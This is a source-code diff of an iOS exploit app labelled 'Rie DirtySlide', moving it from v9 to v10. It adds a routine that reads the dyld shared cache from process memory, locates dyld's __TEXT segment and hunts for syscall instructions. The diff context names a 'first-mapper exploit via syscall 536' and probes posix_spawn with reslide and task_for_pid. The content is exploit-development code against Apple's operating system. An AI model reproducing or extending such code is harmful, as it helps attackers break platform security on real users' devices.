@@ -144,7 +144,7 @@ typedef struct {
     self.logView.editable = NO;
     [self.view addSubview:self.logView];
 
-    [self log:@"=== Rie DirtySlide v9 ==="];
+    [self log:@"=== Rie DirtySlide v10 ==="];
     [self log:[NSString stringWithFormat:@"State: %@", self.isRelaunched ? @"RELAUNCH (RESLIDE)" : @"First run"]];
     [self log:@""];
 
@@ -318,6 +318,170 @@ typedef struct {
     const char *dsc = getenv("DYLD_SHARED_CACHE_DIR");
     [self log:[NSString stringWithFormat:@"DYLD_SHARED_REGION=%s", dsr ?: "(unset)"]];
     [self log:[NSString stringWithFormat:@"DYLD_SHARED_CACHE_DIR=%s", dsc ?: "(unset)"]];
+
+    // Analyze dyld binary in shared cache
+    [self probeDyldBinary];
+}
+
+// ── Probe: find dyld in shared cache, look for syscall 536 invocation ──
+- (void)probeDyldBinary {
+    [self log:@"\n── probeDyldBinary: locating dyld in shared cache... ──"];
+
+    Rie_VMReadOverwriteFn vmr = (Rie_VMReadOverwriteFn)dlsym(RTLD_DEFAULT, "mach_vm_read_overwrite");
+    if (!vmr) { [self log:@"!! no vmr"]; return; }
+
+    // Read main cache header from shared region (cache starts at MWS[0]=0x180000000)
+    uint64_t cacheBase = 0x180000000ULL;
+    uint8_t hdr[0x1000];
+    rie_mach_vm_size_t got = 0;
+    if (vmr(mach_task_self(), cacheBase, sizeof(hdr),
+            (rie_mach_vm_address_t)(uintptr_t)hdr, &got) != KERN_SUCCESS || got < 0x300) {
+        [self log:@"!! cannot read cache header"];
+        return;
+    }
+
+    // Parse cache header to get imagesText array
+    uint64_t imagesTextOffset = *(uint64_t*)(hdr + 0x118);
+    uint64_t imagesTextCount  = *(uint64_t*)(hdr + 0x120);
+    uint32_t mappingOffset    = *(uint32_t*)(hdr + 0x138);
+    uint32_t mappingCount     = *(uint32_t*)(hdr + 0x13C);
+
+    [self log:[NSString stringWithFormat:@"cache: imagesText=%llu@0x%llx mappings=%u",
+        imagesTextCount, imagesTextOffset, mappingCount]];
+
+    if (imagesTextCount == 0 || imagesTextOffset == 0) {
+        [self log:@"!! no imagesText array"];
+        return;
+    }
+
+    // Each image text info is 32 bytes:
+    // { uint64_t address, uint64_t textSegmentSize, uint64_t pathFileOffset }
+    // Actually _dyld_cache_image_text_info: { uint64_t imageOffset, ... }
+    // Let's read the imagesText array (32 bytes per entry)
+    size_t imagesTextSize = (size_t)(imagesTextCount * 32);
+    uint8_t *imagesBuf = (uint8_t *)malloc(imagesTextSize);
+    if (!imagesBuf) { [self log:@"!! malloc imagesBuf"]; return; }
+
+    if (vmr(mach_task_self(), cacheBase + imagesTextOffset, imagesTextSize,
+            (rie_mach_vm_address_t)(uintptr_t)imagesBuf, &got) != KERN_SUCCESS || got < imagesTextSize) {
+        [self log:@"!! cannot read imagesText array"];
+        free(imagesBuf);
+        return;
+    }
+
+    // Search for dyld by path: we need to find it in the path pool
+    // The pathFileOffset in each entry points to the image path string
+    int dyldIdx = -1;
+    uint64_t dyldAddr = 0, dyldSize = 0;
+    for (uint64_t i = 0; i < imagesTextCount; i++) {
+        uint8_t *entry = imagesBuf + i * 32;
+        uint64_t imageAddr, textSize, pathOff;
+        memcpy(&imageAddr, entry + 0, 8);
+        memcpy(&textSize, entry + 8, 8);
+        memcpy(&pathOff, entry + 16, 8);
+
+        // Read path from cache
+        char pathBuf[128] = {0};
+        rie_mach_vm_size_t pgot = 0;
+        if (vmr(mach_task_self(), cacheBase + pathOff, sizeof(pathBuf) - 1,
+                (rie_mach_vm_address_t)(uintptr_t)pathBuf, &pgot) == KERN_SUCCESS) {
+            if (strstr(pathBuf, "/dyld") && !strstr(pathBuf, "sim")) {
+                dyldIdx = (int)i;
+                dyldAddr = imageAddr;
+                dyldSize = textSize;
+                [self log:[NSString stringWithFormat:@"FOUND dyld[%d]: addr=0x%llx size=0x%llx path=%s",
+                    dyldIdx, dyldAddr, dyldSize, pathBuf]];
+                break;
+            }
+        }
+    }
+    free(imagesBuf);
+
+    if (dyldIdx < 0) {
+        [self log:@"!! dyld not found in imagesText"];
+        return;
+    }
+
+    // Read dyld's Mach-O header
+    uint8_t mhdr[0x4000]; // 16KB to cover header + first LC
+    if (vmr(mach_task_self(), dyldAddr, sizeof(mhdr),
+            (rie_mach_vm_address_t)(uintptr_t)mhdr, &got) != KERN_SUCCESS || got < sizeof(uint32_t)*4) {
+        [self log:@"!! cannot read dyld Mach-O"];
+        return;
+    }
+
+    uint32_t magic = *(uint32_t*)mhdr;
+    uint32_t cputype = *(uint32_t*)(mhdr + 4);
+    uint32_t ncmds = *(uint32_t*)(mhdr + 16);
+    uint32_t sizeofcmds = *(uint32_t*)(mhdr + 20);
+    [self log:[NSString stringWithFormat:@"dyld Mach-O: magic=0x%x cputype=%u ncmds=%u",
+        magic, cputype, ncmds]];
+
+    // Parse load commands to find __TEXT segment
+    uint64_t textAddr = 0, textSize = 0, textFileoff = 0;
+    uint32_t off = (magic == MH_MAGIC_64) ? 32 : 28;
+    for (uint32_t ci = 0; ci < ncmds && off < sizeof(mhdr) - 8; ci++) {
+        uint32_t cmd = *(uint32_t*)(mhdr + off);
+        uint32_t cmdsize = *(uint32_t*)(mhdr + off + 4);
+        if (cmd == 0x19) { // LC_SEGMENT_64
+            char segname[17] = {0};
+            memcpy(segname, mhdr + off + 8, 16);
+            if (strcmp(segname, "__TEXT") == 0) {
+                memcpy(&textAddr, mhdr + off + 24, 8);
+                memcpy(&textSize, mhdr + off + 32, 8);
+                memcpy(&textFileoff, mhdr + off + 48, 8);
+                [self log:[NSString stringWithFormat:@"__TEXT: addr=0x%llx size=0x%llx fileoff=0x%llx",
+                    textAddr, textSize, textFileoff]];
+                break;
+            }
+        }
+        off += cmdsize;
+        if (cmdsize == 0) break;
+    }
+
+    if (textAddr == 0 || textSize == 0) {
+        [self log:@"!! __TEXT not found in dyld"];
+        return;
+    }
+
+    // Read the first 64KB of __TEXT to find SVC #0x80 (syscall invocation)
+    size_t searchSz = textSize < 0x10000 ? (size_t)textSize : 0x10000;
+    uint8_t *textBuf = (uint8_t *)malloc(searchSz);
+    if (!textBuf) { [self log:@"!! malloc textBuf"]; return; }
+
+    if (vmr(mach_task_self(), dyldAddr + textFileoff, searchSz,
+            (rie_mach_vm_address_t)(uintptr_t)textBuf, &got) != KERN_SUCCESS || got < 64) {
+        [self log:@"!! cannot read __TEXT"];
+        free(textBuf);
+        return;
+    }
+
+    // Search for SVC #0x80 (0xD4000081 or similar)
+    // arm64: svc #imm16 = D4 00 xx xx (bits 31-24 = 0xD4)
+    // Search byte-by-byte for D4 xx xx pattern with svc opcode
+    int svcCount = 0;
+    for (size_t bi = 0; bi < searchSz - 4 && svcCount < 20; bi++) {
+        if (textBuf[bi+3] != 0xD4) continue;
+        uint32_t insn = *(uint32_t*)(textBuf + bi);
+        // Check if it's SVC: bits 31-24 = 0xD4, bits 1-0 = 0x01
+        if ((insn & 0xFF000003) == 0xD4000001) {
+            // Check preceding instruction for mov x16, #imm
+            uint32_t prev = (bi >= 4) ? *(uint32_t*)(textBuf + bi - 4) : 0;
+            uint16_t imm16 = (insn >> 5) & 0xFFFF;
+            // If prev is movz x16, #imm, extract that immediate
+            // movz x16: sf=1 opc=10 → bits 31-23 = 110100101 = D2
+            BOOL isMovzX16 = ((prev & 0xFFE00000) == 0xD2800000) && ((prev & 0x1F) == 16);
+            uint16_t prevImm = isMovzX16 ? ((prev >> 5) & 0xFFFF) : 0;
+            [self log:[NSString stringWithFormat:@"SVC[%d] @TEXT+0x%zx: insn=0x%08x prev=0x%08x svcImm=0x%x %@",
+                svcCount, bi, insn, prev, imm16,
+                isMovzX16 ? [NSString stringWithFormat:@"movz_x16=0x%x(%u)", prevImm, prevImm] : @"?"]];
+            svcCount++;
+            bi += 3; // skip rest of this instruction
+        }
+    }
+
+    [self log:[NSString stringWithFormat:@"Found %d SVC instructions in first 64KB of __TEXT", svcCount]];
+    free(textBuf);
 }
 
 // ── Probe: test posix_spawn(RESLIDE+SUSPENDED) + task_for_pid viability ──
@@ -430,7 +594,7 @@ typedef struct {
 // ── Stage 3: First-mapper exploit via syscall 536 (v8: child spawn probe) ──
 - (void)runFirstMapper {
     dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
-        [self log:@"\n── Stage 3: Rie v9 First-Mapper ──"];
+        [self log:@"\n── Stage 3: Rie v10 First-Mapper ──"];
         [self clearRelaunchFlag];
 
         long (*sc)(int, ...) = dlsym(RTLD_DEFAULT, "syscall");
